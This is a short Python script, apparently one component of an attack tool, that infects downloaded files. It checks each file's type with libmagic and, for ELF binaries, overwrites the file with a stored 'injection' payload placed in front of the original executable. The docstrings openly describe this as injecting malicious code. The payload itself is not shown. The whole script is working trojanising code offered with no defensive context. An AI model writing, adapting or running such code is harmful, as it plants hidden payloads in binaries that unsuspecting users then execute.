"""
Injects malicious code into files that it can.
"""

import magic

def inject(filename: str) -> str:
    """
    Injects code into the give file if the file type has an injection technique.
    """

    file_type = magic.from_file("downloads/" + filename)

    print(file_type)

    if "ELF" in file_type:
        print("downloaded a binary and am now attaching the exploit to it")
        elf_injection(filename)
    else:
        print("no exploit for this file type")

def elf_injection(filename: str) -> None:
    """
    Performs an injection for an ELF file.
    """

    with open("downloads/" + filename, "rb") as payload, open("injections/elf/injection", "rb") as injection:
        payload_contents = payload.read()
        injection_contents = injection.read()

        final_contents = injection_contents + payload_contents

    with open("downloads/" + filename, "wb") as final:
        final.write(final_contents)

if __name__ == "__main__":
    inject("payload")
